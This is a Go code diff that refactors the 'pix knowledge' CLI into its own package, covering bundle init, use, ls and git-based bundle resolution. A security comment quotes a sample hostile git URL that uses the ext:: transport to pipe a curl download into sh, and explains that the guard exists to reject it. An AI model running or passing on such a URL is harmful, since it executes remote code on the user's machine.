@@ -1,4 +1,4 @@
-package main
+package knowledge
 
 import (
 	"crypto/rand"
@@ -14,12 +14,28 @@ import (
 
 	"pix/host/cli"
 	"pix/host/config"
+	"pix/host/hostenv"
 	"pix/host/rpc"
-	"pix/host/service"
+	"pix/host/sys"
 	"pix/host/workspace"
 )
 
-// runKnowledge is the `knowledge` verb tree: `init`, `use`, `ls`. It scaffolds
+// EnsureServiceUp and PropagateServiceConfig are INJECTED, not imported.
+//
+// Both mean "make the daemon reflect this change", which is composition: it
+// needs the service capability AND this one, so it belongs to whoever composes
+// them. Importing service here would make knowledge a capability calling a
+// sibling, which arch_test.go rejects — and rightly, because that is the edge
+// that turned the old package into a web.
+//
+// cmd/pix wires them at startup. They default to no-ops so a test exercising
+// knowledge alone does not have to fake a daemon.
+var (
+	EnsureServiceUp        = func() {}
+	PropagateServiceConfig = func(io.Writer) {}
+)
+
+// Run is the `knowledge` verb tree: `init`, `use`, `ls`. It scaffolds
 // and wires the GLOBAL OKF knowledge bundle the knowledge service (:11436)
 // indexes, so nobody hand-edits config.toml or hand-authors an OKF skeleton.
 //
@@ -35,18 +51,18 @@ import (
 //	                                  cwd) so recall scopes to it in that workspace.
 //	                                  Does NOT touch global config.
 //	pix knowledge ls             list configured bundles + daemon health.
-func runKnowledge(argv []string) {
+func Run(argv []string) {
 	if len(argv) == 0 {
-		fmt.Fprint(os.Stderr, knowledgeUsage)
+		fmt.Fprint(os.Stderr, Usage)
 		os.Exit(2)
 	}
 	if argv[0] == "-h" || argv[0] == "--help" {
-		fmt.Print(knowledgeUsage)
+		fmt.Print(Usage)
 		return
 	}
 	switch argv[0] {
 	case "init":
-		runKnowledgeInit(argv[1:])
+		RunKnowledgeInit(argv[1:])
 	case "use":
 		runKnowledgeUse(argv[1:])
 	case "ls":
@@ -99,7 +115,7 @@ func runKnowledgeQuery(argv []string) {
 	// Lazy auto-start: spin up the knowledge daemon detached if it is down (only
 	// when the knowledge service is actually enabled; best-effort — a failure
 	// falls through to the existing rpc.ErrServiceDown degrade below).
-	service.EnsureUp([]string{"knowledge"}, service.EnsureTimeout)
+	EnsureServiceUp()
 	res, err := rpc.KnowledgeClient().Call("query", params)
 	if err != nil {
 		cli.ExitFromErr("knowledge query", err)
@@ -290,29 +306,29 @@ func resolveSyncBundle(bundleFlag string) (string, error) {
 	}
 }
 
-// defaultKnowledgeDir is <config-dir>/knowledge — the sibling of config.toml,
+// DefaultKnowledgeDir is <config-dir>/knowledge — the sibling of config.toml,
 // resolved the same way config.Path() resolves its directory.
-func defaultKnowledgeDir() string {
+func DefaultKnowledgeDir() string {
 	return filepath.Join(filepath.Dir(config.Path()), "knowledge")
 }
 
-// knowledgeCacheDir is <config-dir>/knowledge-cache — where git-URL bundles are
+// KnowledgeCacheDir is <config-dir>/knowledge-cache — where git-URL bundles are
 // cloned/pulled so the resolved local path is what gets indexed and scoped.
-func knowledgeCacheDir() string {
+func KnowledgeCacheDir() string {
 	return filepath.Join(filepath.Dir(config.Path()), "knowledge-cache")
 }
 
-// runKnowledgeInit is the CLI entry point for `knowledge init [DIR]`.
-func runKnowledgeInit(argv []string) {
-	dir, help, err := resolveKnowledgeInitArgs(argv)
+// RunKnowledgeInit is the CLI entry point for `knowledge init [DIR]`.
+func RunKnowledgeInit(argv []string) {
+	dir, help, err := ResolveInitArgs(argv)
 	if help {
-		fmt.Print(knowledgeInitUsage)
+		fmt.Print(InitUsage)
 		return
 	}
 	if err != nil {
 		// A flag typo must NOT scaffold a junk bundle or mutate config: bail with a
 		// usage error BEFORE any filesystem / config side effect.
-		fmt.Fprintf(os.Stderr, "pix knowledge init: %v\n\n%s", err, knowledgeInitUsage)
+		fmt.Fprintf(os.Stderr, "pix knowledge init: %v\n\n%s", err, InitUsage)
 		os.Exit(2)
 	}
 	cfg, err := config.Load()
@@ -320,7 +336,7 @@ func runKnowledgeInit(argv []string) {
 		fmt.Fprintf(os.Stderr, "pix knowledge init: loading config: %v\n", err)
 		os.Exit(1)
 	}
-	if err := knowledgeInit(cfg, dir, os.Stdout); err != nil {
+	if err := Init(cfg, dir, os.Stdout); err != nil {
 		fmt.Fprintf(os.Stderr, "pix knowledge init: %v\n", err)
 		os.Exit(1)
 	}
@@ -335,17 +351,17 @@ func runKnowledgeInit(argv []string) {
 // after saving a daemon-affecting change. A package-var seam (like
 // hostBinaryResolver) so tests can observe/neutralize it without launchctl/
 // systemctl probes.
-var knowledgePropagate = func(out io.Writer) { service.PropagateConfig(service.DefaultReloader(), out) }
+var knowledgePropagate = func(out io.Writer) { PropagateServiceConfig(out) }
 
-// resolveKnowledgeInitArgs validates `knowledge init` argv WITHOUT side effects
+// ResolveInitArgs validates `knowledge init` argv WITHOUT side effects
 // so a flag typo can be rejected before any scaffold / git-init / config write.
 // It returns help=true for a -h/--help request, an error for any leading-dash
 // token (mirroring `knowledge use`), else the resolved target dir.
-func resolveKnowledgeInitArgs(argv []string) (dir string, help bool, err error) {
-	if wantsHelp(argv) {
+func ResolveInitArgs(argv []string) (dir string, help bool, err error) {
+	if cli.WantsHelp(argv) {
 		return "", true, nil
 	}
-	dir = defaultKnowledgeDir()
+	dir = DefaultKnowledgeDir()
 	// Validate EVERY token, not just argv[0]: `knowledge init ./kb --jsom` must
 	// reject the trailing flag typo rather than scaffold ./kb + mutate config. Any
 	// dash-prefixed token is an unknown flag; more than one positional is an error
@@ -373,11 +389,11 @@ func resolveKnowledgeInitArgs(argv []string) (dir string, help bool, err error) 
 	return dir, false, nil
 }
 
-// knowledgeInit scaffolds a spec-correct OKF bundle at dir (idempotent: it never
+// Init scaffolds a spec-correct OKF bundle at dir (idempotent: it never
 // clobbers an existing bundle, only fills in missing files), git-inits it when
 // new, then wires it into cfg (knowledge_bundles += dir, services += knowledge)
 // and Save()s. Testable: takes cfg + out and returns an error instead of exiting.
-func knowledgeInit(cfg *config.Config, dir string, out io.Writer) error {
+func Init(cfg *config.Config, dir string, out io.Writer) error {
 	existed := isOKFBundle(dir)
 	if err := os.MkdirAll(dir, 0o755); err != nil {
 		return fmt.Errorf("creating %s: %w", dir, err)
@@ -416,7 +432,7 @@ func knowledgeInit(cfg *config.Config, dir string, out io.Writer) error {
 // KB at a bundle; --project writes a per-repo .pix/knowledge pointer instead
 // and leaves global config untouched.
 func runKnowledgeUse(argv []string) {
-	if wantsHelp(argv) {
+	if cli.WantsHelp(argv) {
 		fmt.Println("usage: pix knowledge use <path|git-url>")
 		fmt.Println("       pix knowledge use --project <path|git-url> [--dir D]")
 		return
@@ -455,7 +471,7 @@ func runKnowledgeUse(argv []string) {
 		os.Exit(2)
 	}
 	if project {
-		if err := knowledgeUseProject(ref, dir, os.Stdout); err != nil {
+		if err := KnowledgeUseProject(ref, dir, os.Stdout); err != nil {
 			fmt.Fprintf(os.Stderr, "pix knowledge use --project: %v\n", err)
 			os.Exit(1)
 		}
@@ -466,29 +482,29 @@ func runKnowledgeUse(argv []string) {
 		fmt.Fprintf(os.Stderr, "pix knowledge use: loading config: %v\n", err)
 		os.Exit(1)
 	}
-	if err := knowledgeUse(cfg, ref, os.Stdout); err != nil {
+	if err := Use(cfg, ref, os.Stdout); err != nil {
 		fmt.Fprintf(os.Stderr, "pix knowledge use: %v\n", err)
 		os.Exit(1)
 	}
-	// Daemon-affecting save → propagate (see runKnowledgeInit).
+	// Daemon-affecting save → propagate (see RunKnowledgeInit).
 	knowledgePropagate(os.Stdout)
 }
 
-// knowledgeUseProject writes the per-project knowledge pointer
+// KnowledgeUseProject writes the per-project knowledge pointer
 // <dir>/.pix/knowledge, resolving ref to a bundle path first (a local path
 // to its absolute form, a git URL cloned/pulled into the cache — same resolver
 // the global `use` uses). It does NOT touch global config: the pointer is meant
 // to be committed to the repo so the project's knowledge travels with it. The
 // launcher's `run` wiring reads this pointer and scopes recall to
 // {global, this-project}.
-func knowledgeUseProject(ref, dir string, out io.Writer) error {
+func KnowledgeUseProject(ref, dir string, out io.Writer) error {
 	// Resolve to clone/pull + validate the bundle, but the resolved cache path is
 	// HOST-LOCAL (e.g. ~/.config/pix/knowledge-cache/...) and MUST NOT be
 	// written into the committed pointer: a teammate who clones the repo would get
 	// a dead path and silently empty recall. Write the PORTABLE ref instead — the
 	// original git URL, or a repo-relative (else absolute) local path. run.go's
 	// projectBundle re-resolves whichever form back to a canonical id at read time.
-	if _, err := resolveBundleRef(ref, knowledgeCacheDir(), out); err != nil {
+	if _, err := ResolveBundleRef(ref, KnowledgeCacheDir(), out); err != nil {
 		return err
 	}
 	if strings.TrimSpace(dir) == "" {
@@ -515,7 +531,7 @@ func knowledgeUseProject(ref, dir string, out io.Writer) error {
 // a canonical bundle id.
 func portablePointerRef(ref, dir string) string {
 	ref = strings.TrimSpace(ref)
-	if isGitURL(ref) {
+	if IsGitURL(ref) {
 		return ref
 	}
 	absBundle, err := filepath.Abs(ref)
@@ -533,12 +549,12 @@ func portablePointerRef(ref, dir string) string {
 	return absBundle
 }
 
-// knowledgeUse points the global KB at an existing bundle: a local path is used
+// Use points the global KB at an existing bundle: a local path is used
 // in place; a git URL is cloned (or pulled if already cached) into
 // <config-dir>/knowledge-cache/<repo>. Either way the resolved local path is
 // added to knowledge_bundles and the knowledge service is enabled.
-func knowledgeUse(cfg *config.Config, ref string, out io.Writer) error {
-	resolved, err := resolveBundleRef(ref, knowledgeCacheDir(), out)
+func Use(cfg *config.Config, ref string, out io.Writer) error {
+	resolved, err := ResolveBundleRef(ref, KnowledgeCacheDir(), out)
 	if err != nil {
 		return err
 	}
@@ -552,14 +568,14 @@ func knowledgeUse(cfg *config.Config, ref string, out io.Writer) error {
 	return nil
 }
 
-// resolveBundleRef turns a bundle reference into an absolute local path. A local
+// ResolveBundleRef turns a bundle reference into an absolute local path. A local
 // path resolves to its absolute form; a git URL is cloned into a
 // collision-free cache dir (cacheDirForURL) or pulled if already present.
 // Cloning requires git — its absence is a clear error on this path (unlike init,
 // where git is optional).
-func resolveBundleRef(ref, cacheDir string, out io.Writer) (string, error) {
+func ResolveBundleRef(ref, cacheDir string, out io.Writer) (string, error) {
 	ref = strings.TrimSpace(ref)
-	if !isGitURL(ref) {
+	if !IsGitURL(ref) {
 		abs, err := filepath.Abs(ref)
 		if err != nil {
 			return "", fmt.Errorf("resolving %s: %w", ref, err)
@@ -567,12 +583,12 @@ func resolveBundleRef(ref, cacheDir string, out io.Writer) (string, error) {
 		return abs, nil
 	}
 	// SECURITY: gate every git resolution through the SAME safeGitURL guard
-	// clonePack uses. isGitURL is a loose CLASSIFIER (anything ending ".git"
+	// clonePack uses. IsGitURL is a loose CLASSIFIER (anything ending ".git"
 	// qualifies), so without this gate a reference like
 	// `ext::sh -c 'curl x|sh' %G.git` would be handed to `git clone`, whose
 	// ext::/fd:: transport helpers execute arbitrary commands. This hardens
 	// both `knowledge use` and pack [[knowledge]] shared refs.
-	if !safeGitURL(ref) {
+	if !cli.SafeGitURL(ref) {
 		return "", fmt.Errorf("refusing unsafe git URL %q (only https/ssh/git remotes; no ext::/file:: transports or local-as-remote)", redactURL(ref))
 	}
 	if _, err := exec.LookPath("git"); err != nil {
@@ -614,7 +630,7 @@ func runKnowledgeLs(argv []string) {
 		cli.ExitFromErr("knowledge ls", err)
 	}
 	if fs.Help {
-		fmt.Print(knowledgeUsage)
+		fmt.Print(Usage)
 		return
 	}
 	if len(positional) > 0 {
@@ -627,10 +643,10 @@ func runKnowledgeLs(argv []string) {
 		os.Exit(1)
 	}
 	if fs.Json {
-		_ = cli.WriteJSONOut(os.Stdout, knowledgeLsView(cfg, defaultShellEnv()))
+		_ = cli.WriteJSONOut(os.Stdout, knowledgeLsView(cfg, hostenv.Env{System: sys.Real{}}))
 		return
 	}
-	knowledgeLs(cfg, defaultShellEnv(), os.Stdout)
+	knowledgeLs(cfg, hostenv.Env{System: sys.Real{}}, os.Stdout)
 }
 
 // knowledgeLsView is the machine-readable snapshot behind `knowledge ls --json`:
@@ -644,7 +660,7 @@ type knowledgeLsSnapshot struct {
 	ProjectPointer string   `json:"project_pointer,omitempty"`
 }
 
-func knowledgeLsView(cfg *config.Config, env shellEnv) knowledgeLsSnapshot {
+func knowledgeLsView(cfg *config.Config, env hostenv.Env) knowledgeLsSnapshot {
 	v := knowledgeLsSnapshot{ConfigPath: config.Path(), Bundles: cfg.KnowledgeBundles}
 	for _, s := range cfg.Services {
 		if s == "knowledge" {
@@ -655,13 +671,13 @@ func knowledgeLsView(cfg *config.Config, env shellEnv) knowledgeLsSnapshot {
 	if v.ServiceEnabled {
 		v.ServiceUp = env.DialLocal(11436)
 	}
-	v.ProjectPointer = readProjectPointer(".")
+	v.ProjectPointer = ReadProjectPointer(".")
 	return v
 }
 
 // knowledgeLs prints the configured knowledge bundles and whether the knowledge
 // service is reachable on :11436. It degrades cleanly when the daemon is down.
-func knowledgeLs(cfg *config.Config, env shellEnv, out io.Writer) {
+func knowledgeLs(cfg *config.Config, env hostenv.Env, out io.Writer) {
 	fmt.Fprintf(out, "# config: %s\n", config.Path())
 	if len(cfg.KnowledgeBundles) == 0 {
 		fmt.Fprintln(out, "knowledge_bundles: (none) — run `pix knowledge init` to create one")
@@ -685,7 +701,7 @@ func knowledgeLs(cfg *config.Config, env shellEnv, out io.Writer) {
 	} else {
 		fmt.Fprintln(out, "service: down (:11436 unreachable) — start it with `pix serve`")
 	}
-	if ptr := readProjectPointer("."); ptr != "" {
+	if ptr := ReadProjectPointer("."); ptr != "" {
 		fmt.Fprintf(out, "project pointer: .pix/knowledge -> %s\n", ptr)
 	}
 }
@@ -697,7 +713,7 @@ func wireKnowledge(cfg *config.Config, dir string) {
 	cfg.AddService("knowledge")
 }
 
-// canonicalizeKnowledgeBundle normalizes a bundle path to the SAME id the
+// CanonicalizeKnowledgeBundle normalizes a bundle path to the SAME id the
 // knowledge store keys its `bundle` column on (host knowledge.go's
 // canonicalizeBundle, design risk #1): absolute + symlink-free + cleaned, with a
 // cleaned-absolute fallback when the path does not exist. Every writer (the
@@ -705,7 +721,7 @@ func wireKnowledge(cfg *config.Config, dir string) {
 // byte-for-byte or `WHERE bundle IN (…)` matches nothing and recall goes silently
 // empty. Replicated here (not imported) because the launcher is a separate
 // dependency-light package.
-func canonicalizeKnowledgeBundle(path string) string {
+func CanonicalizeKnowledgeBundle(path string) string {
 	if path == "" {
 		return ""
 	}
@@ -719,11 +735,11 @@ func canonicalizeKnowledgeBundle(path string) string {
 	return filepath.Clean(abs)
 }
 
-// readProjectPointer returns the raw (unresolved) first meaningful line of
+// ReadProjectPointer returns the raw (unresolved) first meaningful line of
 // <dir>/.pix/knowledge — a local path or git URL — or "" when the pointer is
 // absent/empty. Blank lines and #-comments are skipped so a hand-authored
 // pointer stays readable.
-func readProjectPointer(dir string) string {
+func ReadProjectPointer(dir string) string {
 	b, err := os.ReadFile(filepath.Join(dir, ".pix", "knowledge"))
 	if err != nil {
 		return ""
@@ -742,10 +758,10 @@ func firstNonEmptyLine(s string) string {
 	return ""
 }
 
-// isGitURL reports whether ref should be treated as a git URL (cloneable) rather
+// IsGitURL reports whether ref should be treated as a git URL (cloneable) rather
 // than a local path. Pure and side-effect free so it is unit-testable without
 // touching the network or disk.
-func isGitURL(ref string) bool {
+func IsGitURL(ref string) bool {
 	ref = strings.TrimSpace(ref)
 	switch {
 	case strings.HasPrefix(ref, "http://"),
@@ -883,7 +899,7 @@ func gitRun(dir string, args ...string) error {
 func canonicalBundleIDs(paths []string) []string {
 	var out []string
 	for _, p := range paths {
-		if c := canonicalizeKnowledgeBundle(p); c != "" {
+		if c := CanonicalizeKnowledgeBundle(p); c != "" {
 			out = append(out, c)
 		}
 	}
@@ -895,15 +911,15 @@ func canonicalBundleIDs(paths []string) []string {
 // config.RedactURL so the launcher and host binary redact identically.
 func redactURL(u string) string { return config.RedactURL(u) }
 
-// gitCloneArgs builds gitClone's argv. The `--` terminates option parsing so a
+// GitCloneArgs builds gitClone's argv. The `--` terminates option parsing so a
 // URL beginning with a dash can never be smuggled in as a git option
 // (defense-in-depth behind safeGitURL). Pure so it is unit-testable.
-func gitCloneArgs(url, dest string) []string {
+func GitCloneArgs(url, dest string) []string {
 	return []string{"clone", "-q", "--", url, dest}
 }
 
 func gitClone(url, dest string) error {
-	return exec.Command("git", gitCloneArgs(url, dest)...).Run()
+	return exec.Command("git", GitCloneArgs(url, dest)...).Run()
 }
 
 func gitPull(dir string) error {
